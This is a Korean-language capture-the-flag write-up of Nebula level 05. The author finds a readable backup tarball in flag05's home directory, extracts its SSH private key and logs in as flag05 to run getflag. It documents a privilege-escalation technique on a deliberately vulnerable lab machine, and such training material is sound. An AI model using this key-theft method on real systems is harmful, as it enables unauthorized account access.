# Level 05

## Plot

### About

Check the flag05 home directory. You are looking for weak directory permissions

To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.

## `/home/flag05`로 일단 들어가보자

```text
level05@nebula:~$ cd /home/flag05
level05@nebula:/home/flag05$ ls -al
total 5
drwxr-x--- 1 flag05 level05   60 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 1 flag05 flag05    40 2011-11-20 20:13 .ssh
```

`.backup` 디렉토리에 들어가면 `backup-19072011.tgz` 압축파일이 있는 것을 확인할 수 있다.

```text
level05@nebula:~$ tar -xvsf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ls -al .ssh
total 16
drwxr-xr-x 1 level05 level05  120 2011-07-19 02:37 .
drwxr-x--- 1 level05 level05  200 2018-06-20 05:44 ..
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 authorized_keys
-rw------- 1 level05 level05 1675 2011-07-19 02:37 id_rsa
-rw-r--r-- 1 level05 level05  394 2011-07-19 02:37 id_rsa.pub
-rw-r--r-- 1 level05 level05  222 2018-06-20 06:52 known_hosts
```

이 압축파일을 풀면 `.ssh` 디렉토리와 아래에 몇개의 파일이 있다. 무슨 파일인지 찾다보니 [여길](https://askubuntu.com/questions/88712/how-do-i-backup-ssh-keys) SSH 인증키 파일인 것을 찾았다. 이걸 `flag05`의 홈 디렉토리에서 찾았으니 이 키 파일은 `flag05`의 것이라고 생각할 수 있다. 그래서 압축 풀어서 나온 `.ssh` 디렉토리를 `level05`의 홈 디렉토리에 놓고 `flag05` 계정으로 SSH 연결을 하면 다른 인증 과정 없이 들어가진다!

```text
level05@nebula:~$ ssh flag05@127.0.0.1

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

SSH 관련 파일들을 더 알아보면 좋을 것 같다~